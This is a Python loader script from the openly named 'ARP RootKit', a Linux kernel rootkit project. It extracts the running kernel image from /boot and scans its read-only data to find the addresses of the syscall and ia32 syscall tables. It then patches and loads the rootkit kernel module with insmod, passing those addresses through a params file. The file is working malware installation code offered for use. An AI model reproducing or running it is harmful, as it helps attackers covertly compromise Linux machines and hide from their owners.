#!/usr/bin/python
#    _  __  __     __
#   /_) )_) )_)    )_) _   _  _)_ )_/ o _)_
#  / / / \ /      / \ (_) (_) (_ /  ) ( (_
#
## License
#
# Copyright (c) 2018 Abel Romero Pérez aka D1W0U <abel@abelromero.com>
#
# This file is part of ARP RootKit.
#
# ARP RootKit is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# ARP RootKit is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with ARP RootKit.  If not, see <http://www.gnu.org/licenses/>.
#
## Notes
#

import sys
import os
import subprocess
import re
import platform
import struct

def get_sections_offsets(vmlinux):
	out = subprocess.check_output(["readelf", "-t", "--wide", vmlinux])
	#.text
	#   PROGBITS        ffffffff81000000 200000 c031d1
	pattern = " (?:(?:\.rodata)|(?:\.text))\n\s*?PROGBITS\s*?([a-z0-9]{16}) [a-z0-9]{6,16} ([a-z0-9]{6,16}) "
	regex = re.compile(pattern)
	out = out.decode('utf-8')
	match = regex.findall(out)

	#print (match)
	code_start = int(match[0][0], 16)
	code_end = code_start + int(match[0][1], 16)

	rodata_start = int(match[1][0], 16)
	rodata_end = rodata_start + int(match[1][1], 16)
	
	return (code_start, code_end, rodata_start, rodata_end)

def find_scts_addresses(vmlinux, code_start, code_end, rodata_start, rodata_end):
	secdata = vmlinux + ".data"
	cmd = "objcopy --dump-section .rodata=" + secdata + " " + vmlinux
	if os.system(cmd):
		os.remove(secdata)
		return -1
	f = open(secdata, 'rb')
	c = 0
	sct = 0
	ia32sct = 0
	while True:
		data = f.read(8)
		if data == '' or len(data) < 8:
			break
		data = struct.unpack("=Q", data)
		data = data[0]
		if data >= code_start and data <= code_end:
			c += 1
		else:
			if c > 500 and c < 600:
				sct_len = c
				sct = f.tell()
				sct = sct - c * 8 - 8
				sct = sct + rodata_start
				print("Found sct! %d syscalls at 0x%x" % (c, sct))
			elif c > 300 and c < 500:
				ia32sct_len = c
				ia32sct = f.tell()
				ia32sct = ia32sct - c * 8 - 8
				ia32sct = ia32sct + rodata_start
				print("Found ia32sct! %d syscalls at 0x%x" % (c, ia32sct))
			c = 0

		if sct and ia32sct:
			break

	f.close()
	os.remove(secdata)

	return sct, ia32sct, sct_len, ia32sct_len

def search_vmlinuzes(ref):
	paths = []
	for root, subdirs, files in os.walk("/boot"):
		for _file in files:
			path = root + "/" + _file
			info = subprocess.check_output(["file", path])
			if "bzImage".encode() in info and ref.encode() in info:
				print ("Found possible vmlinuz " + path)
				paths.append(path)
	return paths

if __name__ == "__main__":
	if len(sys.argv) < 2:
		print ("use: %s <lkm>" % (sys.argv[0]))
		sys.exit(-1)

	module = sys.argv[1]
	ref = platform.release()
	for vmlinuz in search_vmlinuzes(ref):
		vmlinux = "vmlinux"
		cmd = "./extract-vmlinux " + vmlinuz + " > " + vmlinux + " 2>/dev/null"
		if os.system(cmd):
			sys.exit(-1)

		code_start, code_end, rodata_start, rodata_end = get_sections_offsets(vmlinux)
		print ("code_start   = %lx\ncode_end     = %lx\nrodata_start = %lx\nrodata_end   = %lx\n" % (code_start, code_end, rodata_start, rodata_end))
		sct, ia32sct, sct_len, ia32sct_len = find_scts_addresses(vmlinux, code_start, code_end, rodata_start, rodata_end)
		print ("sct     = %lx" % sct)
		print ("ia32sct = %lx" % ia32sct)

		# patch for current kernel
		cmd = "python3 patch-lkm.py " + module
		if os.system(cmd):
			sys.exit(-1)

		params = "arprk.params"
		errors = "arprk.errors"

		#cmd = "insmod ./arprk.ko image_text=%ld image_sct=%ld image_ia32sct=%ld text_size=%ld" % (code_start, sct, ia32sct, code_end - code_start)
		# We can't use parameters, as they (structures) differ too much between kernel versions.
		# So, we use an intermediate file, with params.
		f = open(params, "wb")
		f.write(struct.pack("=Q", code_start))
		f.write(struct.pack("=Q", sct))
		f.write(struct.pack("=Q", ia32sct))
		f.write(struct.pack("=Q", code_end - code_start))
		f.write(struct.pack("=Q", sct_len))
		f.write(struct.pack("=Q", ia32sct_len))
		f.close()

		cmd = "insmod " + module + " 2>" + errors
		ret = os.system(cmd)
		print (errors)
		print (ret)
		#if ret != 256:
		f = open(errors, "r")
		data = f.read()
		f.close()
		#	os.remove(errors)
		#	print ("Sorry, load failed. Ret = %d. Error(s):" % ret)
		print (data)
		#	sys.exit(-1)

		os.remove(params)
		os.remove(errors)
		print ("Done!")
